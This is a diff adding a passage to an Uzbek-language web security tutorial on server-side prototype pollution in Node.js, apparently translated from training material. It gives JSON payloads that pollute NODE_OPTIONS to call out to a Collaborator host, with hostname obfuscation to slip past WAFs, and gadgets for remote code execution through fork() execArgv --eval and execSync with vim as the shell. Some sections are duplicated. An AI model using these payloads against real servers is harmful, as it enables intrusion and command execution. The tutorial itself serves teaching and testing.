@@ -278,6 +278,91 @@ Veb-saytlar ko‘pincha **proto** kabi shubhali kalit so‘zlarni filtrlash orqa
 * Ta’qiqlangan kalitlarni obfuskatsiya qilib, sanitizatsiya qilinib qolishini oldini olishi mumkin. Batafsil ma’lumot uchun “Bypassing flawed key sanitization” bo‘limiga qarang.
 * **proto** o‘rniga constructor xususiyati orqali prototype’ga murojaat qilishi mumkin. Batafsil ma’lumot uchun “Prototype pollution via the constructor” bo‘limiga qarang.
 
+
+Server-tomonidagi kirish (input) filtrini chetlab o‘tish
+Veb-saytlar ko‘pincha prototype pollution zaifliklarini oldini olish yoki tuzatish maqsadida `__proto__` kabi shubhali kalitlarni filtrlaydilar. Biroq, bunday kalitlarni “sanitizatsiya” qilish uzoq muddatli va ishonchli yechim emas, chunki uni bir qancha usullar bilan chetlab o‘tish mumkin. Masalan, hujumchi quyidagilarni amalga oshirishi mumkin:
+
+* Ta’qiqlangan kalit so‘zlarni obfuskatsiya qilib, sanitizatsiya qoidalaridan o‘tib ketish. Batafsil ma’lumot uchun “Bypassing flawed key sanitization” bo‘limiga qarang.
+* `__proto__` o‘rniga `constructor` xususiyati orqali prototype’ga murojaat qilish. Batafsil ma’lumot uchun “Prototype pollution via the constructor” bo‘limiga qarang.
+
+Shuningdek, Node ilovalari komandali qatorda `--disable-proto=delete` yoki `--disable-proto=throw` flag’lari yordamida `__proto__` ni o‘chirishi yoki uning ishlashini to‘xtatishi mumkin. Biroq, bu ham `constructor` texnikasi orqali chetlab o‘tilishi mumkin.
+
 Shuningdek, Node ilovalari buyruq qatori flag’lari yordamida **proto** ni o‘chirishi yoki yoniq bo‘lishini oldini olishi mumkin: --disable-proto=delete yoki --disable-proto=throw. Biroq, bu ham constructor texnikasi orqali chetlab o‘tilishi mumkin.
 
+Server-tomonidagi prototype pollution orqali masofadan kod ijrosi (RCE)
+Mijoz tomonidagi (client-side) prototype pollution odatda zaif veb-saytni DOM XSS ga ochadi, ammo server-tomonidagi prototype pollution masofadan kod ijrosiga (RCE) olib kelishi mumkin. Bu bo‘limda qachon bunday imkoniyat paydo bo‘lishini aniqlash va Node ilovalarida ba’zi potentsial vektorlarni qanday ekspluatatsiya qilishni o‘rganasiz.
+
+Zaif so‘rovni aniqlash
+Node da bir qator buyruq ijro (command execution) uchun xavfli sinklar mavjud, ularning ko‘plari `child_process` modulida uchraydi. Bu funksiyalar ko‘pincha siz dastlab prototype ni ifloslantirgan so‘rovdan asinxron tarzda chaqiriladigan boshqa so‘rov tomonidan ishga tushiriladi. Shuning uchun bunday so‘rovlarni aniqlashning eng yaxshi usuli — prototype ni Burp Collaborator bilan muloqotga sabab bo‘ladigan payload bilan ifloslantirishdir.
+
+`NODE_OPTIONS` atrof-muhit (environment) o‘zgaruvchisi yangi Node jarayonini ishga tushirganda avtomatik qo‘llanadigan buyruq satri argumentlarini belgilash imkonini beradi. Bu `env` obyekti xususiyati sifatida ham mavjud bo‘lgani uchun, agar u aniqlanmagan bo‘lsa, prototype pollution orqali uni nazorat qilish mumkin.
+
+Node’ning yangi bolalik jarayonlarini (child processes) yaratish uchun ishlatiladigan ba’zi funksiyalar ixtiyoriy `shell` xususiyatini qabul qiladi; bu orqali ishlab chiquvchilar buyruqlarni bajarish uchun ma’lum bir shell (masalan `bash`) belgilashlari mumkin. Buni zararli `NODE_OPTIONS` xususiyati bilan birlashtirib, har yangi Node jarayoni yaratilganda Burp Collaborator bilan o‘zaro aloqa sodir bo‘ladigan tarzda prototype ni ifloslantirish mumkin:
+
+```
+"__proto__": {
+    "shell":"node",
+    "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"
+}
+```
+
+Shunday qilib, siz qaysi so‘rov yangi child process yaratganini va buyruq satri argumentlari prototype pollution orqali nazorat qilinishi mumkinligini oson aniqlaysiz.
+
+Maslahat
+Hostname ichidagi escap qilingan ikki tirnoq (escaped double-quotes) qat’iy zarur emas. Biroq, bu WAF va boshqa tizimlarning hostname qidirishidan o‘tib ketish uchun hostname’ni obfuskatsiya qilib, false-positive’larni kamaytirishda yordam berishi mumkin.
+
+
+`child_process.fork()` orqali masofadan kod ijrosi (RCE)
+`child_process.spawn()` va `child_process.fork()` kabi usullar ishlab chiquvchilarga yangi Node subprocess (bolalik jarayon) yaratish imkonini beradi. `fork()` metodi `options` obyektini qabul qiladi va shu obyekt ichida potentsial xususiyatlardan biri `execArgv` hisoblanadi. Bu — bolalik jarayon yaratilganda ishlatilishi kerak bo‘lgan buyruq satri argumentlarini o‘z ichiga olgan stringlar massivi. Agar ishlab chiquvchilar bu maydonni aniqlamagan bo‘lishsa, bu `prototype pollution` orqali boshqarilishi mumkin degani.
+
+Ushbu gadjet sizga buyruq satri argumentlarini bevosita nazorat qilish imkonini beradi, bu esa `NODE_OPTIONS` bilan mumkin bo‘lmagan ba’zi hujum vektorlariga yo‘l ochadi. Ayniqsa qiziqtiradigan — `--eval` argumenti bo‘lib, u orqali bolalik jarayonida bajariladigan istalgan JavaScript kodini uzatish mumkin. Bu juda kuchli bo‘lib, hatto qo‘shimcha modullarni muhitga yuklash imkonini ham beradi:
+
+```
+"execArgv": [
+    "--eval=require('<module>')"
+]
+```
+
+`fork()` ga qo‘shimcha ravishda, `child_process` modulida `execSync()` metodi ham mavjud — u istalgan satrni tizim buyruği sifatida bajaradi. Ushbu JavaScript va buyruq injektsiyasi sinklarini zanjirlash orqali siz `prototype pollution` dan foydalanib serverda to‘liq RCE imkoniyatiga ko‘tarilishingiz mumkin.
+
+`child_process.fork()` orqali masofadan kod ijrosi (RCE)
+`child_process.spawn()` va `child_process.fork()` kabi usullar ishlab chiquvchilarga yangi Node subprocess (bolalik jarayon) yaratish imkonini beradi. `fork()` metodi `options` obyektini qabul qiladi va shu obyekt ichida potentsial xususiyatlardan biri `execArgv` hisoblanadi. Bu — bolalik jarayon yaratilganda ishlatilishi kerak bo‘lgan buyruq satri argumentlarini o‘z ichiga olgan stringlar massivi. Agar ishlab chiquvchilar bu maydonni aniqlamagan bo‘lishsa, bu `prototype pollution` orqali boshqarilishi mumkin degani.
+
+Ushbu gadjet sizga buyruq satri argumentlarini bevosita nazorat qilish imkonini beradi, bu esa `NODE_OPTIONS` bilan mumkin bo‘lmagan ba’zi hujum vektorlariga yo‘l ochadi. Ayniqsa qiziqtiradigan — `--eval` argumenti bo‘lib, u orqali bolalik jarayonida bajariladigan istalgan JavaScript kodini uzatish mumkin. Bu juda kuchli bo‘lib, hatto qo‘shimcha modullarni muhitga yuklash imkonini ham beradi:
+
+```
+"execArgv": [
+    "--eval=require('<module>')"
+]
+```
+
+`fork()` ga qo‘shimcha ravishda, `child_process` modulida `execSync()` metodi ham mavjud — u istalgan satrni tizim buyruği sifatida bajaradi. Ushbu JavaScript va buyruq injektsiyasi sinklarini zanjirlash orqali siz `prototype pollution` dan foydalanib serverda to‘liq RCE imkoniyatiga ko‘tarilishingiz mumkin.
+
+child_process.execSync() orqali masofaviy kodni ishga tushirish (RCE)
+Oldingi misolda biz child_process.execSync() sinkini o‘zimiz --eval komandasi orqali yuborgan edik. Ba'zi hollarda esa ilova o‘z-o‘zidan tizim komandalarini bajarish uchun ushbu metodni chaqirishi mumkin.
+
+fork() dagi kabi, execSync() metodi ham opsiyalar ob’ektini qabul qiladi va bu ob’ekt prototip zanjiri orqali ifloslanishi mumkin. Garchi bu execArgv xususiyatini qabul qilmasa ham, siz shell va input xususiyatlarini bir vaqtda ifloslantirish orqali ishlayotgan bolakay jarayonga (child process) tizim komandalarini yuborib, ularni bajarilishiga olib kelishingiz mumkin.
+
+input opsiyasi — bu bolakay jarayonning stdin oqimiga uzatiladigan va execSync() tomonidan tizim komandasini bajarish uchun ishlatiladigan satrdir; komanda berishning boshqa usullari ham mavjud bo‘lgani uchun input xususiyati o‘zi ham aniqlanmasligi mumkin.
+shell opsiyasi esa ishlab chilar ma’lum bir shellda komandani bajarishni xohlaganlarida uni belgilashga imkon beradi. Default bo‘lib execSync() tizimning standart shellini ishlatadi, shuning uchun bu ham aniqlanmasligi mumkin.
+
+Ushbu ikkala xususiyatni ifloslantirish orqali siz ishlab chilarning aslida bajarishni niyat qilgan komandalarini bekor qilib, o‘z xohishingizdagi shellda zararli komandani ishga tushirishingiz mumkin. Lekin bunga bir nechta ogohlantirishlar bor:
+
+* shell opsiyasi faqat shell ijrochi faylining nomini qabul qiladi va qo‘shimcha komanda satri argumentlarini belgilashga ruxsat bermaydi.
+* shell doimo -c argumenti bilan chaqiriladi; aksariyat shell’lar bu orqali satr sifatida berilgan komandani bajaradi. Biroq Node ichida -c bayrog‘ini o‘rnatish ta’rif tekshiruvidan (syntax check) o‘tishiga olib keladi va bu ham komandani bajarilishidan to‘xtatadi. Shuning uchun, Node’ni o‘zi hujum uchun shell sifatida ishlatish murakkab bo‘lib qoladi, garchi ba’zi aylanma yo‘llar mavjud bo‘lsa ham.
+* input xususiyati stdin orqali yuboriladigan yuk (payload) formatida bo‘lgani uchun, siz tanlagan shell stdin’dan komandalarni qabul qilishi kerak.
+
+Ushbu mezonlarga to‘liq mos bo‘lmasa-da, Vim va ex kabi matn muharrirlari shell sifatida ishlatilmasa ham, ular ushbu talablarga javob beradi. Agar serverda ushbu dasturlardan biri o‘rnatilgan bo‘lsa, bu RCE uchun potentsial vektor yaratadi:
+
+```json
+"shell": "vim",
+"input": ":! <command>\n"
+```
+
+Eslatma:
+Vim interaktiv promptga ega va yuborilgan komandani bajarish uchun foydalanuvchi Enter tugmasini bosishini kutadi. Shuning uchun, yuqoridagi misolda ko‘rsatilganidek, yuk oxirida yangi qator (\n) belgisini qo‘shib, Enter bosilishining simulyatsiyasini amalga oshirishingiz kerak bo‘ladi.
+
+Ushbu texnikaning qo‘shimcha cheklovlaridan biri shuki, exploit uchun ishlatmoqchi bo‘lgan ba’zi asboblar ham standart holatda stdin’dan o‘qimaydi. Biroq buni aylanib o‘tishning oddiy usullari mavjud. Masalan, curl uchun siz stdin’dan o‘qib, uning mazmunini POST so‘rovi tanasi sifatida yuborish uchun `-d @-` argumentidan foydalanishingiz mumkin.
+
+Boshqa hollarda esa stdin’ni buyruq argumentlari ro‘yxatiga aylantirib, uni boshqa buyruqqa uzatish uchun `xargs` dan foydalanish mumkin.
 
